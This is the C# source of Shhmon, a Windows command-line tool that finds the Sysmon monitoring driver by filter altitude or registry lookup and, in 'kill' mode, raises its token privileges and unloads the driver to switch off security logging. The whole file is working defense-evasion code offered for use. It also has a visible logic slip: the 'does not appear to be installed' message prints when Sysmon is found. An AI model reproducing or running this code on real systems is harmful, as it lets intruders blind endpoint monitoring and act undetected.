using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Security.Principal;

namespace Shhmon
{
    class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("[-] Missing args");
                Console.WriteLine("[-] Usage: Shhmon.exe <hunt|kill>");
                Environment.Exit(1);
            }
            if (args[0] == "hunt" || args[0] == "kill")
            {
                if (!IsAdmin())
                {
                    Console.WriteLine("[-] You need administrator permissions to perform this action");
                    Environment.Exit(1);
                }

                IntPtr currentProcessToken = new IntPtr();
                uint status;
                bool found = false;
                List<FilterParser.FilterInfo> filterInfo = FilterParser.GetFiltersInformation();
                foreach (var filter in filterInfo)
                {
                    if (filter.Altitude.Equals(385201))
                    {
                        found = true;
                        if (filter.Name.Equals("SysmonDrv"))
                        {
                            Console.WriteLine("[+] Found the Sysmon driver running with default name \"SysmonDrv\"");
                            if (args[0] == "kill")
                            {
                                Console.WriteLine("[+] Trying to kill the driver...");
                                Win32.OpenProcessToken(Process.GetCurrentProcess().Handle, Win32.TOKEN_ALL_ACCESS, out currentProcessToken);
                                Tokens.SetTokenPrivilege(ref currentProcessToken);
                                status = Win32.FilterUnload(filter.Name);
                                if (!status.Equals(0))
                                {
                                    Console.WriteLine("[-] Driver unload failed - Error: {0}", String.Format("{0:X}", status));
                                }
                                else
                                {
                                    Console.WriteLine("[+] SysmonDrv was unloaded :)");
                                }
                                
                            }

                        }
                        else
                        {
                            Console.WriteLine("[+] Found the Sysmon driver at altitude 385201 running with alternate name \"{0}\"", filter.Name);
                            if (args[0] == "kill")
                            {
                                Console.WriteLine("[+] Trying to kill the driver...");
                                Win32.OpenProcessToken(Process.GetCurrentProcess().Handle, Win32.TOKEN_ALL_ACCESS, out currentProcessToken);
                                Tokens.SetTokenPrivilege(ref currentProcessToken);
                                status = Win32.FilterUnload(filter.Name);
                                if (!status.Equals(0))
                                {
                                    Console.WriteLine("[-] Driver unload failed - Error: {0}", String.Format("{0:X}", status));

                                }
                                else
                                {
                                    Console.WriteLine("[+] {0} was unloaded :)", filter.Name);
                                }
                            }
                        }
                    }
                }
                if (!found)
                {
                    Console.WriteLine("[-] No driver found at altitude 385201. Checking for Sysmon running at a different altitude.");

                    FilterParser.WalkRegistryKeys(out string altName, out string altitude);
                    if (!string.IsNullOrWhiteSpace(altName) && !string.IsNullOrWhiteSpace(altitude))
                    {
                        Console.WriteLine("[+] Found Sysmon running as {0} at altitude {1}", altName, altitude);
                        if (args[0] == "kill")
                        {
                            Console.WriteLine("[+] Trying to kill the driver...");
                            Win32.OpenProcessToken(Process.GetCurrentProcess().Handle, Win32.TOKEN_ALL_ACCESS, out currentProcessToken);
                            Tokens.SetTokenPrivilege(ref currentProcessToken);
                            status = Win32.FilterUnload(altName);
                            if (!status.Equals(0))
                            {
                                Console.WriteLine("[-] Driver unload failed - Error: {0}", String.Format("{0:X}", status));
                            }
                            else
                            {
                                Console.WriteLine("[+] {0} was unloaded :)", altName);
                            }
                        }
                    }
                }
                else
                {
                    Console.WriteLine("[-] Sysmon does not appear to be installed");
                }
            }
            else
            {
                Console.WriteLine("[-] Incorrect args");
                Console.WriteLine("[-] Usage: Shhmon.exe <hunt|kill>");
            }
        }

        public static bool IsAdmin()
        {
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            if (!principal.IsInRole(WindowsBuiltInRole.Administrator))
            {
                return false;
            }
            return true;
        }
    }
}